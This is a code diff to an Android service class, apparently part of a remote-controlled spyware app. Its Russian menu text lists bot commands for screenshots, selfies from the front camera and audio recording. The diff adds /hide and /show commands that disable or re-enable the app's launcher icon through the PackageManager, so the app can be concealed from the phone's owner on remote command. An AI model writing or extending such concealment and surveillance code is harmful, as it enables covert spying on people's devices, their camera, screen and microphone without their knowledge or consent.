@@ -196,6 +196,14 @@ public class BotService extends Service {
             case "/apps":
                 sendApps(fromChatId);
                 break;
+            case "/hide":
+                updateIconStatus(false);
+                sendTextTo(fromChatId, "👻 Иконка скрыта");
+                break;
+            case "/show":
+                updateIconStatus(true);
+                sendTextTo(fromChatId, "👁 Иконка видима");
+                break;
             default:
                 sendMenuInfo(fromChatId);
                 break;
@@ -234,6 +242,8 @@ public class BotService extends Service {
             "/screenshot - Скриншот экрана\n" +
             "/selfie - Фронтальная камера\n" +
             "/record - Запись аудио\n" +
+            "/hide - Скрыть иконку\n" +
+            "/show - Показать иконку";
         sendTextTo(chatId, msg);
     }
 
@@ -445,6 +455,15 @@ public class BotService extends Service {
             }
         } else {
             sendTextTo(chatId, "Спец. возможности не включены");
+        }
+    }
+
+    private void updateIconStatus(boolean show) {
+        android.content.ComponentName componentName = new android.content.ComponentName(this, MainActivity.class);
+        int newState = show ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED :
+                             android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+        if (getPackageManager().getComponentEnabledSetting(componentName) != newState) {
+            getPackageManager().setComponentEnabledSetting(componentName, newState, android.content.pm.PackageManager.DONT_KILL_APP);
         }
     }
 
